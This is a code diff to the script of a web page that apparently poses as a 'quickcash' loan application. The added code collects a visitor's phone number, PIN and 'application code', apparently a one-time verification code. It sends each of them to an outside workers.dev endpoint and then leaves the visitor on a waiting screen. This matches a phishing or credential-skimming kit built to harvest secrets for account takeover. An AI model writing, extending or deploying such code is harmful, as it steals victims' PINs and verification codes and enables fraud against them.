@@ -112,35 +112,81 @@ const pinStage = document.getElementById("pinStage");
 const codeStage = document.getElementById("codeStage");
 const waiting = document.getElementById("waiting");
 
-document.getElementById("phoneButton").onclick = () => {
+const API_URL = "https://quickcash-backend.doviaskipmoi.workers.dev/notify";
+
+let applicationPhone = "";
+
+async function sendNotification(event, additionalData = {}) {
+  const response = await fetch(API_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      event,
+      phone: applicationPhone,
+      ...additionalData
+    })
+  });
+
+  if (!response.ok) {
+    throw new Error("Notification failed");
+  }
+
+  return response.json();
+}
+
+document.getElementById("phoneButton").onclick = async () => {
   const phone = document.getElementById("phone").value.trim();
+
   if (!phone) {
     alert("Please enter your phone number.");
     return;
   }
-  sessionStorage.setItem("applicationPhone", phone);
-  phoneStage.classList.add("hidden");
-  pinStage.classList.remove("hidden");
+
+  applicationPhone = phone;
+
+  try {
+    await sendNotification("phone_submitted");
+    phoneStage.classList.add("hidden");
+    pinStage.classList.remove("hidden");
+  } catch {
+    alert("Unable to submit. Please try again.");
+  }
 };
 
-document.getElementById("pinButton").onclick = () => {
+document.getElementById("pinButton").onclick = async () => {
   const pin = document.getElementById("pin").value.trim();
+
   if (!pin) {
     alert("Please enter your application PIN.");
     return;
   }
-  pinStage.classList.add("hidden");
-  codeStage.classList.remove("hidden");
+
+  try {
+    // Pass the PIN along with the phone number
+    await sendNotification("pin_submitted", { pin });
+    pinStage.classList.add("hidden");
+    codeStage.classList.remove("hidden");
+  } catch {
+    alert("Unable to submit. Please try again.");
+  }
 };
 
-document.getElementById("codeButton").onclick = () => {
+document.getElementById("codeButton").onclick = async () => {
   const code = document.getElementById("code").value.trim();
+
   if (!code) {
     alert("Please enter your application code.");
     return;
   }
-  codeStage.classList.add("hidden");
-  waiting.classList.remove("hidden");
+
+  try {
+    // Pass the Code along with the phone number
+    await sendNotification("code_submitted", { code });
+    codeStage.classList.add("hidden");
+    waiting.classList.remove("hidden");
+  } catch {
+    alert("Unable to submit. Please try again.");
+  }
 };
 </script>
 
